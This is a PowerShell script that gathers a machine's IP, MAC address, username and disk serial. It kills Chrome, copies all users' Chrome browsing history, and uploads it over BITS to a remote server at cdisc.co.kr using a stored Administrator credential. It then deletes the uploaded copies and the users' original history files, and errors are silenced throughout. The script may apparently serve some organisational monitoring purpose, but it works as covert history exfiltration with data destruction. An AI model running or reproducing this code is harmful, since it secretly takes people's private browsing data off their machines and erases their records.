$ErrorActionPreference = 'silentlycontinue'
    $env:hostIP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress 
    $env:hostMAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"} | Where-Object {$_.InterfaceDescription -notmatch "TEST"}).MacAddress
    $env:USERNAME
    $sn = (Get-WMIObject win32_physicalmedia | Where-Object {$_.tag -match "PHYSICALDRIVE0"} | select SerialNumber).SerialNumber
if ($sn -ne $null)
{
if ($sn -match " ")
{
$sn = $sn.split(" ")[-1]
}
else
{
$sn = $sn
}
}
elseif ($sn -eq $null)
{
$sn = (Get-WMIObject win32_physicalmedia | Where-Object {$_.tag -match "PHYSICALDRIVE1"} | select SerialNumber).SerialNumber
if ($sn -match " ")
{
$sn = $sn.split(" ")[-1]
}
else
{
$sn = $sn
}
}

function Copy_Up_Chrome
{
    Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Destination C:\ProgramData\soalog\${env:COMPUTERNAME}_${env:USERNAME}_${env:hostIP}_${env:hostMAC}_$sn_$(get-date -f yyyyMMddHHmmss)_ChromeHistory

    
        Import-Module bitstransfer
        $enc = Get-Content C:\Windows\soa\enp.txt | ConvertTo-SecureString # specify the directory where the encrypted password file is located
        $user = "Administrator" # server ID
        $cred = New-Object System.Management.Automation.PSCredential($user,$enc)
        $src = "C:\ProgramData\soalog\*_ChromeHistory"
        Get-ChildItem -path $src |
        foreach {
        $dst = "http://cdisc.co.kr:1024/soa/upload/$($_.name)" # server directory with write permissions
        $job = Start-BitsTransfer -source $($_.FullName) -Destination $dst -Credential $cred -TransferType Upload -Asynchronous

    while (($job.jobstate -eq "Transferring") -or ($job.jobstate -eq "Connecting")) `
    {sleep 10;}
    if ($job.JobState -eq "Transferred")
    {
    Remove-Item $($_.FullName)
    }
    Switch($job.jobstate)
    {
    "Transferred" {Complete-BitsTransfer -BitsJob $job}
    "TransientError" {Resume-BitsTransfer -BitsJob $job}
    "Error" {Resume-BitsTransfer -BitsJob $job}
    }
    $dst.Dispose()
    $job.Dispose()
    }
    $enc.Dispose()
    $user.Dispose()
    $cred.Dispose()
    $src.Dispose()
   Remove-Item -Path 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Force
}



if(get-process chrome)
{
    get-process chrome | stop-process
    Copy_Up_Chrome
    start-process -FilePath 'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'
}
else
{
    Copy_Up_Chrome
}
